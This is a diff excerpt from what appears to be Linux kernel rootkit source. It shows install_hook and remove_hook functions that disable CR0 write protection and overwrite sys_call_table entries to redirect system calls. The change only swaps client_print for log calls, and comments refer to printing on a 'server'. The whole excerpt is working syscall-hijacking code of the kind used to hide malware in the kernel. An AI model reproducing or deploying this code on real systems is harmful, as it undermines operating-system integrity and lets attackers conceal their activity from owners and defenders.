@@ -68,14 +68,14 @@ static int install_hook(struct hook_t *hook){//function that hooks syscall
 		return -1; //returns -1 for error
 	};
 	if (set_memory_protection(false)){ //disables memory protection in cr0- if true memory cannot be disabled
-		client_print("\033[1;31;40m[!]\033[0m unable to disbale memory protection\n"); //prints message on server
+		log("\033[1;31;40m[!]\033[0m unable to disbale memory protection\n"); //prints message on server
 		return -1;
 	}; //disables memory protection in cr0
 
 	__sys_call_table[hook->syscall_number] = (long unsigned int) hook->hooked_syscall; //rewrites the adress of the syscall to hooked function
 
 	if (set_memory_protection(true)){  //enables memory protection in cr0- if true memory cannot be reenabled
-		client_print("\033[1;31;40m[!]\033[0m unable to re-enable memory protection\n"); //prints message on server
+		log("\033[1;31;40m[!]\033[0m unable to re-enable memory protection\n"); //prints message on server
 		return -1; //returns -1 for error
 	};
 	return 0; //returns 0 for no error
@@ -83,16 +83,16 @@ static int install_hook(struct hook_t *hook){//function that hooks syscall
 //sets the sys_call_table back to normal
 static int remove_hook(struct hook_t *hook){ //removes a hook
 	if (!hook->orig_syscall){ //if unable to get original syscall
-		client_print("\033[1;31;40m[!]\033[0m unable to get origional syscall\n"); //prints message on server
+		log("\033[1;31;40m[!]\033[0m unable to get origional syscall\n"); //prints message on server
 		return -1; //returns -1 for error
 	};
 	if (set_memory_protection(false)){//disables memory protection in cr0- if true memory cannot be disabled
-		client_print("\033[1;31;40m[!]\033[0m unable to disable memory protection\n"); //prints message on server
+		log("\033[1;31;40m[!]\033[0m unable to disable memory protection\n"); //prints message on server
 		return -1; //returns -1 for error
 	};
 	__sys_call_table[hook->syscall_number] = (long unsigned int) hook->orig_syscall;
 	if (set_memory_protection(true)){ //enables memory protection in cr0- if true memory cannot be reenabled
-		client_print("\033[1;31;40m[!]\033[0m unable to re-enable memory protection\n"); //prints message on server
+		log("\033[1;31;40m[!]\033[0m unable to re-enable memory protection\n"); //prints message on server
 		return -1; //returns -1 for error
 	};
 	return 0; //returns 0 for no error
